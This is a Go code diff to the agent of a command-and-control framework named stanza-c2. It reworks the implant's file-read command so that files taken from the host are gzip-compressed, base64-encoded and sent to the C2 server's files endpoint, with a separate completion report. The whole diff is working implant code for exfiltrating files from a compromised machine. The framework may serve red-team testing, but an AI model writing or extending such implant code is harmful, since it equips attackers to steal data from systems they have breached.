@@ -1,6 +1,8 @@
 package main
 
 import (
+	"bytes"
+	"compress/gzip"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -16,6 +18,7 @@ import (
 	"time"
 
 	"github.com/jmpsec/stanza-c2/pkg/callbacks"
+	"github.com/jmpsec/stanza-c2/pkg/files"
 	"github.com/jmpsec/stanza-c2/pkg/types"
 )
 
@@ -60,6 +63,8 @@ const (
 	_protoTCP = "tcp"
 	// Protocol UDP
 	_protoUDP = "udp"
+	// Compressed file prefix
+	_compressedPrefix = "GZIP:"
 )
 
 var (
@@ -282,27 +287,64 @@ func processBeaconResponse(callback types.StzCallback, dataList []types.StzBeaco
 				if err != nil {
 					// If error reading file, send error message back to server
 					confirm := types.StzExecutionStatus{
-						Status: types.StzStatusDone,
+						Status: types.StzStatusError,
 						UUID:   config.UUID,
 						ID:     data.ID,
 						Data:   fmt.Sprintf("Error reading file: %s", err),
 					}
-					err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
-					if err != nil && !_silence {
+					if err := sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm); err != nil && !_silence {
 						log.Println(err)
 					}
 					return
 				}
-				// Encode file content in base64
-				encodedContent := base64.StdEncoding.EncodeToString(fileContent)
+				// Compress the file content using gzip
+				var compressedContent bytes.Buffer
+				gzipWriter := gzip.NewWriter(&compressedContent)
+				_, err = gzipWriter.Write(fileContent)
+				if err != nil {
+					confirm := types.StzExecutionStatus{
+						Status: types.StzStatusError,
+						UUID:   config.UUID,
+						ID:     data.ID,
+						Data:   fmt.Sprintf("Error compressing file: %s", err),
+					}
+					if err := sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm); err != nil && !_silence {
+						log.Println(err)
+					}
+					return
+				}
+				// Close the gzip writer
+				if err = gzipWriter.Close(); err != nil {
+					if !_silence {
+						log.Println(err)
+					}
+				}
+				// Encode compressed content in base64
+				encodedContent := base64.StdEncoding.EncodeToString(compressedContent.Bytes())
+				// Add a prefix to indicate the content is compressed
+				finalContent := _compressedPrefix + encodedContent
 				// Confirm command execution with encoded file content
+				fileReq := types.StzFileRequest{
+					ID:        data.ID,
+					UUID:      config.UUID,
+					Fullname:  filePath,
+					MD5:       files.GetMD5(compressedContent.Bytes()),
+					Size:      int64(len(fileContent)),
+					ExfilSize: int64(len(finalContent)),
+					B64Data:   finalContent,
+				}
+				if err := sendHTTPFile(callback.Endpoints[callbacks.FilesEndpoint], fileReq); err != nil && !_silence {
+					log.Println(err)
+				}
+				// Confirm the command is completed
+				txtData := fmt.Sprintf("%d bytes received (%d original size)", fileReq.ExfilSize, fileReq.Size)
 				confirm := types.StzExecutionStatus{
 					Status: types.StzStatusDone,
 					UUID:   config.UUID,
 					ID:     data.ID,
-					Data:   encodedContent,
+					Data:   txtData,
 				}
-				err = sendHTTPExecution(callback.Endpoints[callbacks.FilesEndpoint], confirm)
+				err = sendHTTPExecution(callback.Endpoints[callbacks.ExecutionEndpoint], confirm)
 				if err != nil && !_silence {
 					log.Println(err)
 				}
